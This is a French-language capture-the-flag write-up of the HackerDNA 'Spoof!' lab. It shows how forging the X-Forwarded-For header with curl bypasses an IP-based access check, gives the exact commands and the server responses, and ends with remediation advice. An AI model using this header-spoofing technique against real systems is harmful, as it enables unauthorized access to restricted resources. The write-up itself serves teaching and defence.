# Spoof! — HackerDNA | Write-up

**Plateforme:** HackerDNA  
**Difficulte:** Facile  
**Points:** 10  
**Flags:** 1  
**Taux de reussite global:** 68%  
**Categorie:** IP Spoofing  
**Auteur:** doacyber  

![Spoof Lab](spoof_lab.png)

---

## Introduction

Ce lab simule une application web d'entreprise fictive appelee **TechSolutions** qui restreint l'acces a certaines ressources selon l'adresse IP du visiteur. Seules les connexions venant du reseau interne de l'entreprise sont autorisees.

L'objectif est de contourner cette restriction et de recuperer le flag cache.

---

## Etape 1 — Decouverte de l'application

En accedant a la cible dans le navigateur :

```
http://52.213.44.198/index.php
```

Le serveur affiche le message suivant :

```
TechSolutions

Your IP: 196.207.231.56
You are not connecting from company network (52.213.44.198).
Password is required for external access.
```

Le serveur connait son IP interne : `52.213.44.198`. Il compare l'IP du visiteur avec cette IP et refuse l'acces si ca ne correspond pas.

---

## Etape 2 — Identification de la vulnerabilite

Beaucoup de serveurs web tournent derriere des proxys inverses ou des load balancers. Dans ce cas, l'IP d'origine du client est transmise via des headers HTTP speciaux :

- `X-Forwarded-For`
- `X-Real-IP`
- `Client-IP`

Si le serveur fait confiance a ces headers **sans verifier qu'ils viennent d'un proxy de confiance**, n'importe qui peut les falsifier et se faire passer pour une autre IP.

C'est exactement ce qui se passe ici.

---

## Etape 3 — Exploitation (IP Spoofing via HTTP Header)

J'ai utilise `curl` pour envoyer une requete en ajoutant manuellement le header `X-Forwarded-For` avec l'IP interne de l'entreprise :

```bash
curl -v -L -H "X-Forwarded-For: 52.213.44.198" http://52.213.44.198/index.php
```

Explication de chaque option :

- `curl` : outil pour faire des requetes HTTP depuis le terminal
- `-v` : mode verbose, affiche tous les details de la requete et de la reponse
- `-L` : suit automatiquement les redirections (302, 301...)
- `-H` : ajoute un header HTTP personnalise a la requete
- `"X-Forwarded-For: 52.213.44.198"` : on ment au serveur en lui disant que notre requete vient de l'IP interne

---

## Etape 4 — Resultat

Le serveur a retourne une redirection :

```
HTTP/1.1 302 Found
Location: /2kf84qoqi6sviu7poeu54p9b/flag.txt
```

Grace au `-L`, curl a suivi automatiquement la redirection et a recupere le flag :

```
HTTP/1.1 200 OK
...
xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
```

Le serveur a cru que la requete venait du reseau interne et nous a donne acces au flag.

---

## Ce qui s'est passe en detail

```
Nous                              Serveur
  |                                  |
  |-- X-Forwarded-For: IP interne -->|
  |                                  |
  |   Serveur verifie le header      |
  |   et croit qu'on est en interne  |
  |                                  |
  |<-- 302 redirect vers flag -------|
  |                                  |
  |-- GET /flag.txt ---------------->|
  |                                  |
  |<-- flag ! -----------------------|
```

**Pourquoi le `-L` etait indispensable :** sans lui, curl s'arrete au 302 et n'affiche rien. C'est pour ca que la premiere tentative sans `-L` retournait une reponse vide.

---

## Difficulte rencontree

La premiere commande sans `-L` ne retournait rien :

```bash
curl -H "X-Forwarded-For: 52.213.44.198" http://52.213.44.198/index.php
```

Le serveur repondait bien avec un 302, mais curl s'arretait la et n'affichait pas le contenu. Il fallait ajouter `-L` pour que curl suive la redirection automatiquement jusqu'au flag.

**Lecon retenue :** toujours ajouter `-L` avec curl quand on teste des applis web, car beaucoup utilisent des redirections.

---

## Vulnerabilite identifiee

| Vulnerabilite | Description | Impact |
|---|---|---|
| IP Spoofing via HTTP Headers | Le serveur fait confiance au header X-Forwarded-For sans validation | Contournement du controle d'acces IP |

---

## Remediation

Pour eviter cette vulnerabilite :

- Ne jamais faire confiance aux headers `X-Forwarded-For` ou `X-Real-IP` venant directement des clients
- Faire confiance a ces headers uniquement s'ils viennent de proxys internes de confiance
- Utiliser une authentification reelle plutot qu'un simple controle d'acces par IP
- Valider l'IP source au niveau reseau, pas uniquement au niveau applicatif

---

## Conclusion

Ce challenge demontre qu'un controle d'acces base uniquement sur l'adresse IP est facilement contournable quand le serveur fait confiance a des headers HTTP que n'importe qui peut falsifier. Une seule commande curl a suffi pour bypasser la restriction et obtenir le flag.

![Felicitations](felicitations.png)

---

*Write-up realise par [doacyber](https://github.com/doacyber)*
